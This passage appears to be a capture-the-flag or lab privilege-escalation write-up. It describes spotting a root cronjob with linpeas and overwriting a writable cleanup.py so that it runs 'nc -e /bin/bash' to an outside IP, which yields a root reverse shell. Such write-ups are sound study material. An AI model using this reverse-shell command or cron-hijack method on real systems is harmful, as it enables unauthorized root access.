#### -Per linpeas.sh scan I found the following cronjob running every 3 minutes

![](../Pasted%20Images/Pasted%20image%2020220601135047.png)

#### -Cat'd "/var/www/html/booked/cleanup.py" and found the following:

![](../Pasted%20Images/Pasted%20image%2020220601135120.png)

##### -As I kept receiving errors when trying to navigate on "vi" locally on target machine I created a "cleanup.py" file on my kali machine and changed "rm -r /var/www/html/booked/uploads/reservation/* " to "nc -e /bin/bash 192.168.49.235 21":

![](../Pasted%20Images/Pasted%20image%2020220601135204.png)

##### -I then uploaded the "cleanup.py" script I created onto target machine and typed "mv cleanup.py /var/www/html/booked/" to overwrite the existing cleanup.py file in /var/www/html/booked/ and started a netcat listener on port 21 and waited a few minutes and received a root shell:

![](../Pasted%20Images/Pasted%20image%2020220601135304.png)